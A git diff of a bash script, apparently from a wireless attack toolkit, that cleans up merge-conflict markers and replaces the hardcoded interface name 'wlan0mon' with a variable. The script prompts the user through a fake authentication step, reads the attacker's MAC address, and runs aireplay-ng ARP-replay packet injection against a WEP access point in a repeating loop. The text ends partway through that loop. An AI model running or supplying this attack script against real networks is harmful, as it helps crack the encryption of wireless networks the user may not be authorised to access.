@@ -1,40 +1,25 @@
 #! /bin/bash
-<<<<<<< HEAD
 WLANNM=$(cat /root/lscript/wlanmon.txt)
 export WLANNM
-=======
->>>>>>> origin/master
 while true
 do
 	echo -e "----------------------\e[1;33mPacket injection\e[0m-----------------------"
 	echo -e "You need to do the Fake-authentication first!(on the other terminal)"
 	if [ "$FIRSTT" = "1" ]
 	then
-<<<<<<< HEAD
 		aireplay-ng -3 -b $WEPB -h $MYMAC $WLANNM
-=======
-		aireplay-ng -3 -b $WEPB -h $MYMAC wlan0mon
->>>>>>> origin/master
 	else
 		echo -e "Press \e[1;33many key\e[0m to start fake authentication..."
 		read
 		echo -e "Getting you MAC...."
 		sleep 1
-<<<<<<< HEAD
 		MYMAC=$(ifconfig $WLANNM | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
-=======
-		MYMAC=$(ifconfig wlan0mon | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
->>>>>>> origin/master
 		echo -e "Your MAC is $MYMAC"
 		sleep 1
 		echo -e "Starting packet injection..."
 		sleep 1
 		FIRSTT="1"
-<<<<<<< HEAD
 		aireplay-ng -3 -b $WEPB -h $MYMAC $WLANNM
-=======
-		aireplay-ng -3 -b $WEPB -h $MYMAC wlan0mon
->>>>>>> origin/master
 	fi
 	echo -e "Inject packets again?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=yes): "
 	read REF
